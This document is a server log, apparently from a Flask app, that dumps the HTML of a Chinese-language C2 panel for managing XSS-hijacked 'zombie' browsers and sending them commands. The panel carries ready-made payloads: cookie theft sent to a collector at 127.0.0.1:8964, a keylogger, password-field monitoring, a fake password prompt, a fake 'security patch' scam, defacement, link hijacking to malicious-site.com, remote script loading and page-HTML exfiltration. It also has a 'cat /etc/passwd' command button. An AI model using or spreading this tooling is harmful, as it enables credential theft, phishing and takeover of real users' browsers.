殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:08:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:08:42] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:08:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:08:42] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-26 22:08:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:08:42] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-26 22:08:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:08:44] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:08:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:08:55 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:08:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:08:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:08:55] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:08:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:08:56 | INFO     | control_route.py:260 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:08:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0024s) -> 回傳: <Response 737 bytes [200 OK]>
2025-06-26 22:08:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:08:56] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:14:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:14:59 | INFO     | control_route.py:260 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:14:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 737 bytes [200 OK]>
2025-06-26 22:14:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:14:59] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:34:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:34:38 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:34:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0059s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 